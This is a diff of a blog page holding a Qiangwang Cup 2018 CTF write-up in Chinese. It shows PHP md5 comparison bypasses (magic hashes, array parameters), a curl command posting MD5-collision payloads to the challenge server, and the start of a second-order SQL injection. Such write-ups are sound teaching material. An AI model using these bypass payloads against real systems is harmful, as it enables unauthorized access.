@@ -393,15 +393,15 @@
         <h4 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h4><p>这题下载下来一个bmp文件，尝试最低位隐写无果后，尝试offset，最后在offset100位后找到flag</p>
 <p><img src="划水之强网杯2018writeup/welcome.png" alt=""></p>
 <p>flag: qwb{W3lc0me}</p>
-<h4 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目地址：`http://39.107.33.96:10000/`</span><br></pre></td></tr></table></figure>
+<h4 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h4><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目地址：`http:<span class="comment">//39.107.33.96:10000/`</span></span><br></pre></td></tr></table></figure>
 <p>第一层：使用了弱等于，php弱类型绕过 0e开头的全部相等</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!=$_POST[<span class="string">'param2'</span>] &amp;&amp; md5($_POST[<span class="string">'param1'</span>])==md5($_POST[<span class="string">'param2'</span>]))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"success!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1=240610708&amp;param2=QNKCDZO</span><br></pre></td></tr></table></figure>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">para<span class="name">m1</span>=<span class="number">240610708</span>&amp;para<span class="name">m2</span>=Q<span class="symbol">NKCDZO</span></span><br></pre></td></tr></table></figure>
 <p>第二层：使用了强等于(不仅检查数值还检查类型)，md5函数无法处理数组参数返回NULL </p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!==$_POST[<span class="string">'param2'</span>] &amp;&amp; md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"success!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]=1&amp;param2[]=2</span><br></pre></td></tr></table></figure>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1<span class="string">[]</span>=<span class="number">1</span>&amp;param2<span class="string">[]</span>=<span class="number">2</span></span><br></pre></td></tr></table></figure>
 <p>第三层：使用了强等于和强制字符串转化</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((string)$_POST[<span class="string">'param1'</span>]!==(string)$_POST[<span class="string">'param2'</span>] &amp;&amp; md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"success!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>脚本<a href="https://blog.csdn.net/caiqiiqi/article/details/68953730） [数据出处](https://www.jianshu.com/p/c9089fd5b1ba" target="_blank" rel="noopener">参考</a></p>
@@ -410,7 +410,7 @@
 <p>附 l3m0n师傅的解法：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v http://39.107.33.96:10000/ -H "Cookie: PHPSESSID=on8uv0kfij2h7lm2uramtluo53" --data "param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2"</span><br></pre></td></tr></table></figure>
 <p>Flag: QWB{s1gns1gns1gnaftermd5}</p>
-<h4 id="Three-hit"><a href="#Three-hit" class="headerlink" title="Three hit"></a>Three hit</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目地址：http://39.107.32.29:10000</span><br></pre></td></tr></table></figure>
+<h4 id="Three-hit"><a href="#Three-hit" class="headerlink" title="Three hit"></a>Three hit</h4><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目地址：<span class="string">http:</span><span class="comment">//39.107.32.29:10000</span></span><br></pre></td></tr></table></figure>
 <p>这个题目是一个二次注入，用户注册会将age存入数据库，登陆成功后profile.php界面会从数据库中查询具有相同age的username。</p>
 <p><strong>二次注入</strong>：源于开发人员对数据库中的数据太过信任，凡是提取数据库中来自用户的数据不经过处理，即可触发二次注入。</p>
 <p>测试过程中发现age必须为数字。于是通过<strong>hex编码绕过</strong> </p>
@@ -567,7 +567,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-count">20</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -577,7 +577,7 @@
               
               
               <div class="site-state-item site-state-categories">
-                <a href="/CTF/index.html">
+                <a href="/代码审计/index.html">
                   <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
